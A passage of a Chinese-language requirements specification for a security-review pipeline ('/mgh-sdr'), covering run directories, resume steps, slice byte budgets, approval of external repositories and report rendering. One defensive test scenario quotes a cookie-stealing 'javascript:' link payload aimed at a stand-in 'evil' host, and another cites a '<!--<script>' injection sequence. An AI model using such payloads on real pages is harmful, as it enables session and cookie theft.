#### Scenario: launcher 重跑会新建 run 目录(缺口如实成立)

- **WHEN** 对同一 branch 再次运行 `mgh_sdr_launch.py`(同参数)
- **THEN** 产生一个新的 `<repo>/.mgh-sdr/runs/<ts>-<branch>/` 目录,上一次 run 的 marker 不被复用;
  该行为 SHALL 在命令壳的恢复指引与 `/mgh-sdr` 的诚实边界中披露(不得宣称「重跑 launcher 即续跑」)

#### Scenario: 完成/干净停止后哨兵移除

- **WHEN** 流程跑完(报告渲染完成)或用户干净停止(含 `--dry-run` 早退之外的正常退出路径)
- **THEN** `<repo>/.mgh-sdr/.active` 被移除;残留哨兵的 run(宿主被硬杀)由下次 launcher 启动时
  检测并复用/清理,不静默锁死日常开发

#### Scenario: 壳内恢复指引在真实 sdr 运行目录可执行

- **WHEN** 审阅命令壳的恢复/排障段并按其中逐字给出的命令实跑(工作目录为任意 sdr 运行目录)
- **THEN** 每条被引用的检查命令以退出码 0(状态正常)或 2(状态异常,fail-loud)返回,NEVER 因
  "状态根目录不存在"以退出码 1 失败;命令中出现的脚本参数与 sdr 运行目录的实际布局一致
  (`--check <run-dir>` 形态在册)

#### Scenario: 拥塞形态的产物自检是域内命令

- **WHEN** 编排器遇到 `stalled:true` 需要先判定"磁盘上分组产物有没有坏"再同参重派
- **THEN** 它跑 `diff_group.py --check <run-dir>`(域内可执行,退出码 0/2),NEVER 跑在 sdr 运行目录下
  必然以退出码 1 失败的跨域脚本;该命令的语义边界(校验产物完整性、非运行进度自洽性)SHALL 在该指引
  处就近披露,使编排器不会把它读成完整的恢复面

### Requirement: sdr 运行目录无起始态文件;codegraph 信号由脚本确定性写出

`/mgh-sdr` 的运行目录 SHALL NOT 携带**起始态**文件:`run_config.json` 内的起始态字段
(repo / base / branch / 维度相关开关)SHALL NOT 由任何一方写入,亦 SHALL NOT 被任何一方读取。
起始态 SHALL 从既有磁盘产物重派生:repo / base / branch 由 `sdr_context.py` 产出的
`<run-dir>/context.json` 承载(`diff_group.py` 亦将其写进 `grouping.json`);run 目录布局本身
(`<repo>/.mgh-sdr/runs/<…>`)给出 repo。两处记录冲突时以 `context.json` 为准并在 `notes[]` 披露。

`<run-dir>/run_config.json` 作为**codegraph 信号载体**保留,但其唯一载荷 SHALL 为
`{"no_codegraph": <bool>}`(dispatcher 的 `{{codegraph}}` 占位符来源,见 `fanout-dispatch`),
且 SHALL 由**确定性脚本副作用**写出——`sdr_context.py` 完成基线投影与外部仓检索后 co-write
(与其哨兵写入同一副作用位置,取 `--no-codegraph` flag)。命令壳 SHALL NOT 再手执行 `Bash printf`
配方写该文件;launcher SHALL 经 `_run_context` 透传 `--no-codegraph`,使两条入口写出同源内容。
缺失 / 不可解析一律落 `off`(既有 legacy 语义不变)。

唯一在磁盘上**无**起始态可派生的步是 `not-started`(context.json 尚未写出),而该步也是**零已完成工作**的
步:重新给参(`--base` / `--branch`)重跑即完整恢复,不构成恢复面缺口——这一条 SHALL 由
`resume-step-discipline` 的「起始态不可重派生时的显式退化披露」断言。

#### Scenario: 运行目录里没有起始态字段

- **WHEN** 一次完整的 `/mgh-sdr` run 结束,审阅 `<run-dir>/run_config.json`
- **THEN** 该文件(若存在)只含 `no_codegraph` 一个字段;无 repo / base / branch / 维度字段;
  repo/base/branch 可从 `context.json` 与 `grouping.json` 读出

#### Scenario: 壳中不再有手执行的写入配方

- **WHEN** 审阅 `mgh-sdr.md` 双壳的 Orchestration flow
- **THEN** 两壳都不含写 `run_config.json` 或哨兵的 `printf` 配方(两者都改由 `sdr_context.py` 写出);
  两壳关于该点的措辞一致

#### Scenario: 两条入口写出同源的 codegraph 信号

- **WHEN** 分别经 launcher 与经宿主会话的 `sdr_context.py` 启动同一 branch 的 run
- **THEN** 两条路径产生的 `<run-dir>/run_config.json` 内容同构(同一 `--no-codegraph` 取值 →
  同一载荷),均由脚本写出而非编排器手执行

### Requirement: sdr 双壳恢复指引接上状态查询

`releases/claude-code/commands/mgh-sdr.md` 与 `releases/opencode/command/mgh-sdr.md` SHALL 在恢复/中断段
指引编排器**首调** `resume_sdr_state.py --run-dir <abs>`,从 stdout 读 `step` / `next_action` /
`discipline_reminders[]`,再按该步纪律执行(闸门 → 路径配方 → 硬边界)。壳中指向 init 域脚本
(`resume_state.py`)的调用 SHALL 被移除——该脚本只认 init 运行目录,在 sdr 下必然失败(不可执行指引)。

该段 SHALL 陈述续跑的前置条件(**带着同一个 run 目录路径**),并如实披露 launcher 重跑会新建 run 目录。
壳 SHALL 声明恢复路径的抗压缩性:进度与纪律纯从磁盘重派生,与对话记忆是否保留无关。

#### Scenario: 壳的恢复指引可执行

- **WHEN** 编排器在 sdr 中断后按壳的恢复段执行第一步
- **THEN** 该步给出的是 `resume_sdr_state.py --run-dir <abs>`(sdr 域脚本)而非 init 域的 `resume_state.py`;
  按其 stdout 的 `next_action` 继续即接上流水线

#### Scenario: 双壳恢复段文案一致

- **WHEN** 比对 claude 壳与 opencode 壳的恢复段
- **THEN** 两者对同一恢复路径的措辞同构(宿主差异只留在工具名/路径前缀层)

### Requirement: 切片物化的字节闸门与超预算三级处置

`diff_group.py` 的字节预算 SHALL 以**物化出去的切片文件的实际字节数**为判据,而非打包期的估算量。测量
SHALL 复用与物化同一个渲染逻辑(单一真相源),**NEVER** 并行维护第二套尺寸估算;测量值 SHALL 为渲染文本
的 utf-8 编码字节数。打包期的成员大小(standalone 目录簇归并、interface 成分贪心打包)SHALL 一律改用该
实测值判定,既有「路由序排序确定性」与「**不切文件中部**」两条规则不变。

实测超预算时,处置 SHALL 按以下固定顺序进行,前者可解则不进下一级:

1. **无损重切**:单元含多个文件且实测超预算 → 按既有贪心打包规则再切为续单元(`unit_id` 沿用既有
   `-partN` 形态命名,`chain[]` 随每一份续单元携带,与既有规则一致),每份续单元实测 ≤ 其适用上限。
   本级的 `SHALL NOT` 丢失任何 hunk、`SHALL NOT` 截断任何内容——单元数增加是唯一代价。
2. **上下文瘦身**:仅当单元**已不可再切**(单文件原子残渣)且仍超预算时,SHALL 对该单元的描述性上下文块
   按确定性上限截断(字符串与列表两种形态均须处理)。**证据锚点 MUST NOT 被截断**——diff 正文、文件
   清单、hunk 定位头(`@@ <path> @@ new-file lines N+C`)、以及被下游校验器检查的字段全部保留。截断
   MUST 在切片文件内以可见标记呈现(形如 `… (截断:K 行 / 原 N 字节)`),使子代理知晓其上下文不完整;
   被截字段与原始字节数 MUST 记入产出。
3. **fail-loud 零派发**:瘦身后仍超预算 → 退出码 2,stderr MUST 报出该单元的 `unit_id`、适用上限、实测
   字节数与最大贡献文件。判定 SHALL 发生在写出任何切片文件与待办清单**之前**(零副作用),使
   `fanout_runner --tier sdr` 对枚举脚本退出码 2 的原样透传即等价于零派发。

三级处置 SHALL NOT 引入任何新增 CLI flag:`--max-standalone-bytes`(standalone 簇归并上限)与
`--max-interface-bytes`(interface 单元上限)仍是唯二的预算调节杆,两级内部瘦身上限为脚本内模块常量。
适用上限的选取 SHALL 为:standalone 单元用前者,interface 单元(含其续单元)用后者。

`grouping.json` SHALL 新增顶层预算记录(本次运行实际生效的两个上限)与每单元瘦身痕迹
(`slimmed{字段名: 原始字节数}`;未截断为空对象)。`--check <run-dir>` SHALL 在相应字段存在时断言
`pending[]` 每项的 `unit_bytes` ≤ 其适用上限、且 `slimmed` 结构合法(值为整数映射);字段缺失(旧
`grouping.json`)SHALL 跳过该断言,不得因此判违规——向后兼容与既有 `excluded`/`codegraph_stats`/
`chain[]` 的增量字段同例。人读报告的诚实边界 SHALL 在本次运行发生过瘦身时披露被瘦身单元及其降低的
输入完整度(重切本身不降低完整度,不属披露面)。

预算内路径 SHALL 逐字节不变:切片文本、`pending[]` 既有字段、退出码与既有 stderr 行均与引入本要求前
一致。

#### Scenario: 多文件单元实测超预算时无损重切

- **WHEN** 一个含多个文件的 standalone 单元(或一个 interface 单元的多个成分)渲染后实测字节 > 其适用上限,
  而其中任一文件单独渲染 ≤ 上限
- **THEN** 该单元按既有贪心规则切成多个续单元,每份续单元实测 ≤ 上限;所有 hunk 与上下文一份不少地分布
  在续单元中(并集与切分前等价),不触发瘦身、不 fail-loud

#### Scenario: 单文件原子残渣经瘦身仍可复核

- **WHEN** 一个单元只剩单文件且渲染实测 > 上限,但其超出量可由截断描述性上下文块(注解上下文 / 符号表)
  消除
- **THEN** 该单元被物化,切片内的上下文块带可见截断标记、diff 正文与文件清单与 hunk 定位头完整保留;
  `grouping.json` 该项 `slimmed` 记录被截字段与原始字节数;运行不 fail-loud

#### Scenario: 单文件原子残渣瘦身仍超预算则零副作用终止

- **WHEN** 单个文件的 diff 正文本身即超过上限(截断上下文块无法把实测降到上限内)
- **THEN** `diff_group.py` 退出码 2,stderr 报出该单元 `unit_id`、适用上限、实测字节数与最大贡献文件;
  该次运行不写出任何切片文件、不写出可被派发器消费的待办清单;`fanout_runner --tier sdr` 透传退出码 2,
  零子代理被派出

#### Scenario: 闸门判据与切片产物同源

- **WHEN** 任一单元被物化,`pending[]` 项携带 `unit_bytes`
- **THEN** 该值等于其切片文件的实际字节数,且 ≤ 该单元的适用上限(瘦身单元亦同——判据与产物出自同一渲染)

#### Scenario: 预算内路径逐字节不变

- **WHEN** 一次运行的每个单元实测均 ≤ 适用上限
- **THEN** 每份切片文本与 `pending[]` 既有字段与引入本要求前逐字节一致;退出码与既有 stderr 行不变;
  新增的预算记录与空 `slimmed` 是仅有的增量

#### Scenario: 旧 grouping.json 仍是 --check 合规产物

- **WHEN** `--check <run-dir>` 面对一份不含预算记录与 `slimmed` 的旧 `grouping.json`
- **THEN** 预算断言被跳过,退出码 0(旧产物逐字兼容);含新字段时断言生效,超上限或结构非法则退出码 2

#### Scenario: 瘦身痕迹进入报告边界声明

- **WHEN** 一次运行中有单元被瘦身后派发
- **THEN** 渲染报告的诚实边界列出被瘦身单元及其"上下文经截断、输入完整度低于常规单元"的说明;未发生
  瘦身时该条目不出现

### Requirement: 外部仓审批单命令闭环与未知参数报错出口

`sdr_context.py` SHALL 新增 `--approve-external <abs>`(可重复):在检索开始前,对每个传入路径执行
与 `read_roots_config.py --add` **同源**的校验与原子写(存在且为目录,违者退出码 2 + 可操作 stderr,
幂等:已配置条目为 no-op),登记成功后该仓**当次运行即被检索**并随既有 co-write 进入哨兵
`read_roots[]`。审批语义不破:该 flag SHALL 仅由编排器在宿主会话获用户明示同意后传入,脚本与编排器
SHALL NOT 自行批准;`read_roots_config.py --add` + 重跑的既有路径保持逐字可用(两条入口同 schema、
同原子写逻辑,NEVER 各维护一份写实现)。

`sdr_context.py` SHALL 对未识别参数做审批语义的模糊识别:当未知 flag 名(去 `--`、小写、分词后)
命中 `approve` / `read` / `external` 任一词根时,stderr SHALL 在 argparse 原生报错之后追加一段
可照抄执行的配方——经 `read_roots_config.py --target <repo> --add <abs>` 批准(或同脚本
`--approve-external` 形态重跑本命令)——配方中的脚本绝对路径与 `<repo>` 由脚本自身拼接产出;
未命中词根的未知 flag 维持 argparse 原报错(退出码 2 不变)。

#### Scenario: 同意后单命令完成审批与检索

- **WHEN** 首轮运行报出 `pending_approval:["D:/xxx/front"]`,用户同意,编排器按壳配方重跑
  `sdr_context.py --repo <abs> --run-dir <abs> --approve-external D:/xxx/front`
- **THEN** `D:/xxx/front` 写入 `<repo>/.mgh/read-roots.json`(与 `read_roots_config.py --add` 产物
  逐字段同形),当次 stdout `external_repos[]` 含该仓记录、`pending_approval` 为空,哨兵
  `read_roots[]` 含该根

#### Scenario: 非法审批目标 fail-loud

- **WHEN** `--approve-external D:/gone`(不存在或不是目录)
- **THEN** 退出码 2,配置零写入,stderr 指明条目无效(与 `read_roots_config.py --add` 同判据)

#### Scenario: 发明的审批参数得到出口配方

- **WHEN** 编排器对 `sdr_context.py` 传入其未声明的 `--approve-external-repos`(或任何命中
  `approve`/`read`/`external` 词根的未知 flag;实现侧对「已声明的 `--approve-external`」不误伤)
- **THEN** 退出码 2,stderr 除 argparse 原生报错外追加可照抄的批准+重跑配方(含脚本绝对路径与
  `--target <repo>`),编排器无需再探索即可走对路径

#### Scenario: 已配置仓重复批准为 no-op

- **WHEN** 对已写入配置的仓再次传 `--approve-external <同一路径>`
- **THEN** 配置不变(`added:[]` 语义),当次照常检索该仓,退出码 0

### Requirement: 产出者 stdout 摘要视图与审批滞留提醒

`sdr_context.py` 与 `diff_group.py` SHALL 各支持 `--summary`:与完整调用同参数运行(含幂等重跑的
副作用语义不变),但 stdout 只输出**定长的关键量视图——不改动任何已落盘产物**:

- `sdr_context.py --summary` 的 stdout SHALL 含 `repo`/`run_dir`/`base`/`branch`/`baseline_path`/
  `baseline_bytes`/`baseline_truncated`/`sensitive_catalog_source`/`external_repos[]`(每项仅
  `path`/`slug`/`summary_path`/`diff_files`/`bytes`/`truncated`,**不含** `route_hits[]` 明细)/
  `external_skipped[]`/`pending_approval[]`;完整记录仍在 `<run-dir>/context.json`。
- `diff_group.py --summary` 的 stdout SHALL 含单元计数与分布(`pending_total`/`done`/`failed`、
  interface/standalone/partN 计数)、`excluded{count}` 与 `empty` 谓词,以及分页字段
  (`effective_limit`/`offset`);`pending[]` 各项的路径字段在摘要形态下 SHALL 以
  `slices_dir` + 单元相对后缀给出**或**保持绝对逐字(二选一在契约文档落定,选后不得漂移);
  完整 `pending[]` 仍在非摘要调用与 `grouping.json`。

`--summary` 缺省时两脚本 stdout SHALL 与现状逐字一致(纯附加,零回归面)。

`sdr_context.py --check <run-dir>` SHALL 在产物自洽之外追加 advisory:读 `<run-dir>/context.json`,
`pending_approval[]` 非空 → stderr 打印「外部仓声明未批、零读取降级」并列出条目(不改退出码——
未批是合法降级态,不是破损态)。

#### Scenario: 摘要视图免文件中介

- **WHEN** 编排器跑 step 1 只想知道「基线多大、外部仓检索了几何、有无待批」
- **THEN** `sdr_context.py --summary`(同参)的 stdout 为上述关键量,单屏可读;编排器 NEVER 需要
  `| tail`、重定向到文件、或 `describe_artifact.py` 之外再内联解析

#### Scenario: 非摘要调用逐字不变

- **WHEN** 同一参数下分别以缺省形态与 `--summary` 形态运行,再比对缺省形态与改动前基线
- **THEN** 缺省形态 stdout 与基线逐字一致;`--summary` 不落任何新文件、不改动 `context.json`

#### Scenario: check 对未批外部仓出声

- **WHEN** 某 run 的 `context.json` 含 `pending_approval:["D:/xxx/front"]`,编排器跑
  `sdr_context.py --check <run-dir>`
- **THEN** 退出码仍为 0(产物完好),stderr 出现含该路径的未批提醒行;若 `pending_approval` 为空则
  无该行

### Requirement: sdr 命令壳暴露产物内省与 stdout 直消费配方

`/mgh-sdr` 双端命令壳 SHALL 在步骤级配方中就近暴露以下合法出口(先于任何拦截发生):

- step 1 与 step 2 段各含一条「需检查产物结构/字段 →
  `py <mgh-core>/scripts/describe_artifact.py --in <abs-json> --keys|--field a.b.c|--shape|--sample N`」
  配方(确切脚本名与 flag 形态逐字镜像其 `--help` 契约);
- step 1/2 各含一句「stdout = 单个 JSON 对象、stderr = 进度与提醒;正常路径从 Bash 工具返回值直接
  消费,NEVER 重定向到文件再回读;输出过大时用 `--summary`(step 1/2 均支持),需 narrowing 用
  `describe_artifact.py --field`」;
- 硬边界 (b) 的措辞 SHALL 覆盖解释器内联代码的**全部**喂入形态:`-c`、解释器后跟独占 `-`(heredoc
  经 stdin)、here-string(如 `- <<<`),而非仅 `-c`;
- 审批闸门的「同意」分支 SHALL 以 `sdr_context.py --approve-external <abs>` 为推荐路径,
  `read_roots_config.py --add` + 重跑保留为等价路径(两条文案都给出,语义一致)。

双壳(宿主路径)在上述各点的措辞 SHALL 同构(宿主差异只留在工具名/路径前缀层)。

#### Scenario: describe_artifact 配方在壳内可见

- **WHEN** 审阅两份 `mgh-sdr.md` 的 step 1 与 step 2 段
- **THEN** 每份都含 `describe_artifact.py` 的确切调用形态(与守卫 recipe 的推荐一致),且含
  「stdout 直消费 + `--summary`」声明;编排器在**首次**需要内省前即知道合法出口

#### Scenario: 双壳措辞同构

- **WHEN** 比对 claude 壳与 opencode 壳的新增配方段
- **THEN** 除路径前缀(`.claude/mgh-core` vs `.opencode/mgh-core`)外逐句一致

### Requirement: 零参默认执行(/mgh-sdr 双壳)

`/mgh-sdr` 命令壳(claude 与 opencode 双份,行为对等)SHALL 声明安全默认集并支持零参直接
执行:**无任何参数**调用时,MUST 按 `--base master`、`--branch` 当前分支、`--dimensions`
全部 6 维直接进入编排流程,NEVER 因缺参而停止索取输入;传 `--help` 时 MUST 仍仅打印
参数表后 STOP(零 token、零解析)。默认值 MUST 由确定性脚本的 argparse 兜底解析
(`sdr_context.py` / `diff_group.py` 的 `--base` 默认 `master`、`--branch` 空值时取
`git rev-parse --abbrev-ref HEAD`),编排器 NEVER 自行执行 `git rev-parse` 猜分支;
run 目录与报告的分支命名 MUST 消费 step 1 stdout 已解析的 `branch`/`base` 字段。
参数表 SHALL 逐项标注「不传即默认」,使零参与显式传默认值两条路径产物等价。本行为是
对家族纪律「无参 STOP」的显式例外,例外条件(命令声明安全默认集 + 参数表明示)MUST
同步写入研发手册 R5.6 措辞,防止后续按旧纪律「修回去」。

#### Scenario: 零参直接跑完整流水线

- **WHEN** 用户在目标仓根目录调用 `/mgh-sdr`(不带任何参数)
- **THEN** 编排器不打印参数表、不停止索取输入,按 base=master / branch=当前分支 /
  全部 6 维执行 step 0–5,产出项目根中文报告;`--base`/`--branch` 在默认路径下整体
  省略,由脚本 argparse 解析默认

#### Scenario: --help 仍零 token 早停

- **WHEN** 用户调用 `/mgh-sdr --help`(或 `/mgh-sdr -h`)
- **THEN** 壳仅打印参数表后 STOP,不执行任何流水线步骤、不写任何产物、不武装哨兵

#### Scenario: 双壳对等

- **WHEN** 同一零参调用分别发生在 claude 与 opencode 宿主
- **THEN** 两份命令壳的零参默认执行与 `--help` STOP 行为逐字一致,仅宿主路径前缀与
  超时标定差异保留(与既有双壳差异面相同)

### Requirement: 宿主解释器一次性探测(/mgh-sdr 双壳 step 0)

`/mgh-sdr` 双壳 SHALL 在 step 0 放置一条**解释器探测配方**:单条 Bash 命令以 `;` 分隔
依次执行候选探测(`py --version`、`python --version`、`python3 --version`,各候选失败
不中断后续),一次跑完即可看到全部候选的可用性与版本,候选集 MUST 覆盖 Windows Python
Launcher(`py`)与 POSIX 惯例(`python3`/`python`)。编排器 SHALL 取第一个执行成功且版本
≥3.10 的候选为**本次 run 的解释器**,此后壳内所有 `*.py` 脚本调用 MUST 逐字使用该
解释器——壳内示例中的 `py` 为**规范占位 token**,语义 = step 0 选中的解释器,示例文本
MUST NOT 因探测机制改写为其他占位符。上下文压缩 / 崩溃恢复 / 新会话后若选中解释器
不确定,MUST 重跑探测命令(单条、廉价)重建该事实,NEVER 对流水线脚本逐个换解释器名
试错。探测结果 SHALL NOT 落盘(`run_config.json` / 哨兵 schema 不变);若所有候选均
不可用或版本均 <3.10,编排器 MUST 早停并向用户披露(零派发、移除已武装哨兵,与其他
step 1 前干净停止路径同构)。

#### Scenario: 无 py 的 Linux 环境一次探测定型

- **WHEN** 宿主机器无 `py` 启动器,仅有 `python3`(≥3.10)
- **THEN** step 0 探测命令单条跑完,输出显示 `py` 不可用、`python3` 可用及版本;
  编排器选定 `python3` 并用于后续全部脚本调用,流水线全程零「解释器不存在」试错

#### Scenario: 压缩后新会话重探测

- **WHEN** run 中途上下文被压缩、新会话按「中断恢复」章节接续,编排器无法从对话记忆
  确定选中解释器
- **THEN** 编排器重跑同一条探测命令选定解释器(不从磁盘猜、不逐个试错),再继续
  resume 流程

#### Scenario: 全部候选不可用早停

- **WHEN** 探测命令显示无候选解释器存在,或全部候选版本 <3.10
- **THEN** 编排器在任何流水线步骤前 STOP,向用户披露探测输出与依赖要求,移除 step 0
  已武装哨兵,零切片物化、零派发

### Requirement: 非 ASCII 路径保真与 Windows 写盘安全

`diff_group.py` 的 git 采集 SHALL 以 `core.quotePath=false` 配置运行全部产生路径输出的 git
子命令(至少 `diff`):非 ASCII 路径(中文文件名为目标环境常态)SHALL 以原样字符进入解析,
SHALL NOT 因 git 的引号转义输出形态而丢文件、丢 hunk 或漏计 `excluded`——含非 ASCII 路径的
变更文件与含 ASCII 路径的变更文件在分组、切片物化、`excluded` 计数与 `empty` 判定上 SHALL
完全同权;若某文件在解析层仍无法建立锚点,SHALL 计入显式披露计数或以非零退出报错,SHALL NOT
呈现为与「真零 diff」不可区分的 `empty:true` 退出 0。

单元产物文件名(`unit_id` 派生的切片文件名)SHALL 经 Windows/NTFS 非法字符闭集清洗:替换集
SHALL 至少覆盖 `/ \ : * ? < > | "` 九字符(Windows 保留名与结尾点/空格按既有处理不变);清洗
后 SHALL NOT 出现任何一字符,使切片写盘在 Windows 上 SHALL NOT 因非法文件名抛出未捕获异常——
写盘失败若仍发生,SHALL 以 stderr 诊断 + 契约内退出码终止,SHALL NOT 裸 traceback 且
stdout 保持契约形态。

`--limit <n>` SHALL 拒绝负值:退出码 2 + 可操作报错(负值属误用,SHALL NOT 被 clamp 成空页
静默成功);`--check` 与互斥旗标(`--base`/`--branch`/`--offset`/`--limit`/`--summary`/
`--include-excluded`)同传时 SHALL 在 stderr 显式提示旗标被忽略,SHALL NOT 双向静默。

#### Scenario: 中文文件名的 diff 完整进入分组

- **WHEN** 目标分支存在一个中文文件名(如 `src/妇科/患者控制器.java`)的 `.java` 变更,
  以默认 git 配置(未设 `core.quotePath`)运行 `diff_group.py`
- **THEN** 该文件以正确中文名进入变更文件清单并产出评审单元与切片文件,hunk 完整;
  `excluded` 与 `empty` 判定不受影响;该文件不再对解析器呈现为不可识别的引号转义形

#### Scenario: 非 ASCII 文件是唯一变更时不与真零 diff 混淆

- **WHEN** 唯一变更文件为非 ASCII 路径且解析成功
- **THEN** stdout 报 `empty:false` 与该文件计数,退出码 0;不存在「文件被吞 + `empty:true`
  + `excluded:0`」的静默丢失形态

#### Scenario: catch-all 路由注解在 Windows 可写盘

- **WHEN** 变更含 `@GetMapping("/**")` 的 controller(路由值含 `*`),在 Windows 上运行
- **THEN** 派生的 `unit_id` 经清洗后成为合法 NTFS 文件名,切片写盘成功,退出码与 stdout
  符合契约(无裸 traceback);清洗仅影响落盘文件名,路由串在 slice/报告中的呈现不变

#### Scenario: 新增 controller 单 hunk 时路由分簇不坍缩

- **WHEN** 一个新增(A)controller 文件含多个路由方法、整文件为单个 hunk,经注解启发式分组
- **THEN** 每个"变更符号"均与该 hunk 建立归属(每 hunk 覆盖全部符号),各路由方法进入
  changed/anchors,分组不坍缩为单单元;归属下标越界时写入侧过滤,不抛错

#### Scenario: 超预算贪心拆分的 hunk 并集无损

- **WHEN** 一个多成员 interface 单元各成员单独渲染 ≤ 适用上限、合并渲染 > 上限(贪心拆分
  分支被触发的形态)
- **THEN** 每个开启新 part 的成员其 files/hunks 完整进入该 part,所有 hunk 的 locator 并集
  与拆分前等价(无损重切既有承诺的兑现);part 的路由标签与其装载成员一致

#### Scenario: 误用参数显式拒绝

- **WHEN** 调用传 `--limit -5`,或 `--check` 与 `--base` 同传
- **THEN** 前者退出码 2 并报出合法取值范围;后者 stderr 明示被忽略的旗标后按 `--check`
  语义执行;两条路径均无静默

### Requirement: 报告渲染的输入敌意防御与降级路径数据保真

报告渲染器(`render_sdr_report.py`)SHALL 把 LLM 草稿字段(findings 的 file/chain/line/
severity 等,引述受审仓库与外部前端仓源码)视为**敌意输入**:

- **链接化白名单语义**:findings「位置」的链接化 SHALL 仅对仓内相对路径启用——相对路径
  首段含冒号(`:`)的取值(scheme 形如 `javascript:`、盘符相对形如 `C:foo`)SHALL 放弃
  链接化、降级纯文本展示;判定 SHALL 同时作用于入口原始值与路径归一后的最终值(normpath
  的斜杠折叠 SHALL NOT 复活 scheme 载荷)。绝对路径分支的既有白名单语义不变。
- **草稿错型容错**:任何标量字段的类型错乱(如 severity 为数组/对象)SHALL 落确定性默认值
  或既有降级路径,渲染与 `--check` 双路径 SHALL NOT 因草稿内容抛出未捕获异常、SHALL NOT
  产生契约外退出码。
- **嵌入转义闭集**:JSON 数据块内嵌 HTML `<script>` 的转义 SHALL 覆盖 HTML 解析器的
  script-data-double-escaped 状态——数据中出现 `<!--` 后随 `<script` 的序列 SHALL NOT
  使页面自身渲染 JS 被解析器当作数据文本吞掉;转义 SHALL 与解析等价(数据块经 JS 反序列化
  后与 canonical 数据文件语义逐值等价),`--check` 的同源比对 SHALL 继续成立。
- **降级路径数据保真**:存在 failed 评审单元时,报告简表与其数据载体的行-单元对应关系
  SHALL 保持对齐——failed 单元 SHALL 与其行同进退(其行不残留未填占位、后续单元 SHALL NOT
  错位继承他人取值);前端使用两列与路由命中计数的 join SHALL 按精确路由串匹配(嵌套前缀
  路由 SHALL NOT 互相串计),报告、manifest、canonical 数据三载体 SHALL 一致,`--check`
  SHALL 能检出不一致。

#### Scenario: scheme 载荷降级纯文本

- **WHEN** 某条 finding 的 file 字段为 `javascript:location=`https:/evil/${document.cookie}`
  (无空格、无圆括号)或 `C:Windows/evil.java`
- **THEN** 渲染产物中该条目为纯文本,任何 `<a href>` SHALL NOT 携带该取值;canonical
  数据文件中该字段原样保留(数据不失真,只不做链接)

#### Scenario: 错型 severity 不崩渲染与校验

- **WHEN** 某草稿含 `"severity": ["high"]` 或 `"severity": {}`
- **THEN** 渲染与 `--check` 均正常完成、退出码符合契约;该条 severity 落默认级;stderr/
  披露不静默吞掉异常形态(可提示修复草稿)

#### Scenario: 敌意引述不吞页面 JS

- **WHEN** 某条 finding 的风险描述或引述含 `<!--<script>` 序列(外部前端仓片段的现实形态)
- **THEN** 渲染后报告页面自身全部渲染 JS 正常执行、六章节完整呈现;嵌入数据反序列化后与
  canonical 数据语义逐值等价;`--check` 对该产物 exit 0

#### Scenario: failed 单元存在时简表不错位

- **WHEN** 一次 run 的单元中恰有一个 failed、其余 ok 且部分命中前端路由
- **THEN** 简表每行的前端两列与该行单元自身对应:命中单元显示其命中,未命中单元显示无,
  failed 行不显示他人取值;manifest/data/HTML 三载体一致;`--check` exit 0

#### Scenario: 嵌套路由计数不串位

- **WHEN** 两个接口路由为前缀嵌套关系(如 `/api/user` 与 `/api/user/list`),前端命中计量
  仅覆盖其中之一
- **THEN** 仅被计量的路由在前端两列显示命中,另一路由不因子串包含而显示命中;「无前端使用」
  SHALL NOT 被标为「有」

### Requirement: 外部仓检索物化与过滤的正确性

外部仓受控检索的结论物化与遍历 SHALL 满足以下正确性约束(「存量安全设计基线投影与外部仓
受控检索」既有检索/授权/降级行为不变):

- **结论物化唯一性**:每个已批准外部仓的结论目录 SHALL 以**解析后全路径**唯一确定(basename
  同名仓以确定性消歧后缀区分)——两个已批准仓 SHALL NEVER 共享结论目录,任何仓的结论记录
  (`summary_path` 等)SHALL 指向该仓自己的证据文件;前仓证据 SHALL NOT 因后仓检索被覆盖或
  丢失。声明去重 SHALL 以解析后路径为键:同一仓的等价路径写法(含 `..` 变体)SHALL 去重为
  一次检索,SHALL NOT 双倍检索或互相错配。
- **目录过滤相对性**:外部仓内的目录跳过判定 SHALL 基于仓内相对路径的组件——外部仓的祖先
  目录名(仓外路径段)SHALL NOT 触发跳过;命中过滤规则的目录 SHALL 按同一规则如实跳过并
  保持既有披露语义。命中计数 SHALL NEVER 因祖先目录名产生静默假零。
- **下钻前剪枝**:外部仓遍历 SHALL 应用目录剪枝于下钻之前——被跳过目录(构建产物、依赖目录、
  `.git` 等)SHALL NOT 被遍历读取;同一仓的配置文件命中收集与文本文件收集 SHALL 合并为
  单遍遍历,SHALL NOT 对同一棵树做多遍无剪枝全树扫描。
- **校验判定与运行时一致**:`--check` 对基线产物尺寸的断言 SHALL 依据本次运行**实际生效**的
  基线预算(产物中记录;缺失时按默认预算向后兼容),SHALL NEVER 以硬编码的默认倍数否决按
  显式更大预算合法产出的产物。
- **回退归因诚实**:同名分支缺失时的检索回退 SHALL 如实归因(实际使用的参照分支),SHALL NOT
  在结论文件中声称使用了未实际使用的分支参照。
- **候选提取卫生**:外部仓路径候选提取 SHALL 排除 URL 形态 token(含 scheme 分隔符),
  `external_skipped` SHALL NOT 出现以 URL 拼造的伪路径条目。

#### Scenario: 同名外部仓结论互不覆盖

- **WHEN** 两个已批准外部仓的 basename 同名(如 `D:/work/projA/front` 与 `D:/other/projB/front`),
  各含不同标记的权限配置命中
- **THEN** 结论目录下存在两个各自独立的结论目录,两份记录的 `summary_path` 分别指向各自
  仓的证据文件且内容与各仓命中一致;`--check` exit 0 且证据链可追溯

#### Scenario: 同一仓的路径变体写法去重

- **WHEN** 存量设计对同一外部仓以两种等价写法声明(其一含 `..` 中间段)
- **THEN** 去重为一次检索、一份结论;NEVER 双倍检索或共享错配目录

#### Scenario: 祖先目录名不误伤整仓

- **WHEN** 外部仓位于祖先目录名含 `build`(如 `D:/ci/build/front`)的路径下,仓内无该名目录
- **THEN** 该仓正常检索,路由命中计数为真实值;命中为零时为零(NEVER 因祖先目录名静默假零)

#### Scenario: 被剪枝目录不被读取

- **WHEN** 外部仓含 `.git`、`node_modules` 等规则内目录
- **THEN** 遍历不进入这些目录(其内文件不参与命中计数与文本收集);检索结果与全量扫描但
  过滤产出的结果一致

#### Scenario: 大预算合法产物通过校验

- **WHEN** 以 `--baseline-budget-bytes 400000` 运行产出 162KB 基线(truncated=false),对该
  run 执行 `--check`
- **THEN** 尺寸断言按记录的生效预算判定,exit 0(NEVER 以默认预算倍数的硬编码阈值误报
  「unexpectedly huge」)

#### Scenario: 回退分支如实归因

- **WHEN** 外部仓不存在同名分支,检索回退到该仓当前检出分支
- **THEN** 结论文件的归因描述与实际使用的分支一致(如实表述当前检出分支,NEVER 声称
  「默认分支」)

### Requirement: 分发面披露与实现事实同步

sdr 的分发面文档(三面命令壳、三面 agent 定义、dsh SKILL、任务模板、`core/contracts/sdr/**`
